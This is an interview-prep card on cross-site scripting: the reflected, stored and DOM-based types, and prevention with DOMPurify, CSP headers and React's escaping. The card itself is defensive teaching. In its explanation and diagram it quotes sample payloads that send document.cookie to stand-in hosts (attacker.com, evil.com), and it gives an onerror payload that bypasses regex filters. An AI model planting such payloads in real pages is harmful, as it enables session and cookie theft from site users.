# T3103 · Cross-Site Scripting (XSS) Mitigation: Reflected, Stored & DOM-Based XSS Prevention

**Difficulty:** Medium  
**Companies Asked:** Google, Meta, Amazon, Microsoft, Stripe, Cloudflare  
**Interview Frequency:** ★★★★★  
**Category:** Security  
**Concepts:** security, xss, csp, dompurify, sanitization, security-headers  

## Question

What are the 3 primary types of **Cross-Site Scripting (XSS)** vulnerabilities (**Reflected**, **Stored**, and **DOM-Based XSS**), how do attackers exploit `dangerouslySetInnerHTML` in React apps, and how do Content Security Policy (CSP) headers and `DOMPurify` HTML sanitization prevent malicious script execution?

## Expected Answer

1. **The 3 XSS Flaw Types**:
   - **Stored XSS (Persistent)**: Malicious script is saved in the database (e.g., user comment containing `<script>fetch('attacker.com?c='+document.cookie)</script>`) and served to all visiting users.
   - **Reflected XSS (Non-Persistent)**: Malicious script is injected via URL query parameters (`http://site.com/search?q=<script>...`) and reflected back in server response.
   - **DOM-Based XSS**: Malicious input is processed entirely on the client side via un-sanitized DOM sinks (`innerHTML = location.hash`).
2. **Prevention Strategy**:
   - **Sanitization (`DOMPurify`)**: Always sanitize HTML strings before rendering with `dangerouslySetInnerHTML`.
   - **Content Security Policy (CSP)**: HTTP header restricting script source origins (`script-src 'self' https://trusted.cdn.com`).
   - **Context-Aware Escaping**: React escapes JSX values automatically (`<div>{userInput}</div>`), but `dangerouslySetInnerHTML` bypasses this safety check.

## Deep Explanation

### XSS Execution Flow

```
Attacker injects payload: <img src=x onerror="fetch('https://evil.com/steal?c='+document.cookie)">
                               │
       ┌───────────────────────┴───────────────────────┐
       ▼                                               ▼
Without DOMPurify Sanitization               With DOMPurify Sanitization
App renders payload -> Executed!              DOMPurify strips onerror handler!
Cookies/Tokens Exfiltrated!                   Safe HTML rendered: <img src="x">
```

## Production Example

```javascript
// Production Pattern: Safe HTML Sanitization with DOMPurify
import DOMPurify from 'dompurify';

export function SafeRichTextRenderer({ rawHtmlContent }) {
  // Sanitize untrusted HTML payload before inserting into DOM!
  const sanitizedHtml = DOMPurify.sanitize(rawHtmlContent, {
    ALLOWED_TAGS: ['b', 'i', 'em', 'strong', 'a', 'p', 'ul', 'li', 'code'],
    ALLOWED_ATTR: ['href', 'target', 'rel'],
    ALLOW_DATA_ATTR: false,
  });

  return (
    <div
      className="rich-text-container"
      dangerouslySetInnerHTML={{ __html: sanitizedHtml }}
    />
  );
}
```

```http
<!-- Recommended Security Headers to enforce in Nginx / Cloudflare / Next.js -->
Content-Security-Policy: default-src 'self'; script-src 'self' 'nonce-rAnd0m123'; object-src 'none'; base-uri 'self';
X-Content-Type-Options: nosniff
X-Frame-Options: DENY
Referrer-Policy: strict-origin-when-cross-origin
```

## Best Practices

- Configure `DOMPurify.addHook('afterSanitizeAttributes', ...)` to force `rel="noopener noreferrer"` on all dynamic target links.
- Enforce strict `Content-Security-Policy` with nonces (`'nonce-...'`) to block inline script injection entirely.

## Common Mistakes

- Relying on naive regex replacements (e.g. `str.replace(/<script>/gi, '')`) to sanitize HTML strings — attackers easily bypass regex filters using `<img src=x onerror=alert(1)>` or nested tags.

## Follow-up Questions

1. How does the Trusted Types API (`window.trustedTypes`) block un-sanitized string assignments to `element.innerHTML` at the browser level?

## Related Topics

- Content Security Policy (CSP) Directives, Nonces & Hashes
- Client-Side Storage Architecture: `localStorage` vs Cookies
